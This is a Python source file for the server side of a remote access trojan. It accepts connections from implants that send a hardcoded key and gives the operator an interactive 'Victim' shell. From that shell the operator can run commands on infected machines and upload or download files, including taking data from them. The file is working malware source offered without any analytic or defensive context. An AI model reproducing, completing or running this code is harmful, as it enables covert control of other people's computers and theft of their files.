import socket
import threading
import base64
import os

SECRET_KEY = '35WUy#7,Me.ZykkdWk'

clients = []
lock = threading.Lock()

DELIM = b'<<<END>>>\n'

def recv_until_delim(sock, delim=DELIM):
    data = b""
    while True:
        part = sock.recv(4096)
        if not part:
            break
        data += part
        if delim in data:
            break
    return data.replace(delim, b"")

def send_file_to_victim(filepath, sock):
    filename = os.path.basename(filepath)
    with open(filepath, "rb") as f:
        b64_data = base64.b64encode(f.read()).decode()
    sock.send(f"upload {filename}\n".encode())
    sock.sendall((b64_data + "<<<END>>>\n").encode())
    output = recv_until_delim(sock).decode(errors='ignore')
    print(output.strip())

def save_file_from_base64(b64_data, output_filename):
    abs_path = os.path.abspath(output_filename)
    with open(abs_path, "wb") as f:
        f.write(base64.b64decode(b64_data))
    print(f"[+] File saved at: {abs_path}")

def handle_client(sock, address, index):

    try:
        handshake = sock.recv(1024).decode(errors='ignore').strip()


        if handshake != SECRET_KEY:
            print(f"[-] Rejected unknown client: {address[0]}:{address[1]}")
            sock.close()
            return

        with lock:
            clients.append({'index': index, 'sock': sock, 'address': address})
        print(f"[+] Client {index} connected: {address[0]}:{address[1]}")

    except Exception as e:
        print(f"[-] Error handling client {address[0]}: {e}")
        sock.close()

def controller_shell():
    while True:
        print("\nConnected Clients:")
        for c in clients:
            print(f"  [{c['index']}] {c['address'][0]}:{c['address'][1]}")
        try:
            choice = int(input("Enter client index to interact (r to refresh): "))
        except ValueError:
            continue
        if choice == ['refresh','r']:
            continue

        client = next((c for c in clients if c['index'] == choice), None)
        if not client:
            print("[!] Invalid client index.")
            continue

        sock = client['sock']
        while True:
            cmd = input(f"Victim-{choice}> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ['exit', 'quit']:
                print(f"[+] Disconnected Victim-{choice}")
                break
            if cmd.lower() in ['kill']:
                sock.send((cmd + "\n").encode())
                sock.close()
                clients.remove(client)
                print(f"[+] Killed Victim-{choice}")
                break

            if cmd.lower() in ["help--"]:
                print("""
Available Commands:
  upload {absolute path}       Upload file to victim's current directory
  download {filename}          Download file from victim
  cd {dir}                     Change victim's working directory
  dir                          List files
  help--                       Show this help message
  exit / quit                  Close victim connection
  kill                         Disconnects victim 
""")
                continue

            if cmd.startswith("upload "):
                try:
                    filepath = cmd.split(" ", 1)[1].strip('"')
                    if not os.path.isfile(filepath):
                        print(f"[!] File not found: {filepath}")
                        continue
                    send_file_to_victim(filepath, sock)
                    continue
                except Exception as ex:
                    print(f"Error: {ex}")

            sock.send((cmd + "\n").encode())
            output = recv_until_delim(sock).decode(errors='ignore')

            if cmd.startswith("download "):
                try: 
                    filename = cmd.split(" ", 1)[1].strip('"')
                    save_file_from_base64(output, os.path.basename(filename))
                    print(f"[+] File '{filename}' downloaded.")
                except Exception as ex:
                    print(f"Error: {ex}")
            else:
                print(output.strip())


def start_server():


    host = '0.0.0.0' 
    port = 54832 #----fix-----


    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    print(f"[+] Listening on {host}:{port}")

    index = 0
    threading.Thread(target=controller_shell, daemon=True).start()

    while True:
        try:
            client_sock, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_sock, addr, index), daemon=True).start()
            index += 1
        except KeyboardInterrupt:
            print("\n[!] Shutting down server.")
            server.close()
            break

if __name__ == "__main__":
    start_server()
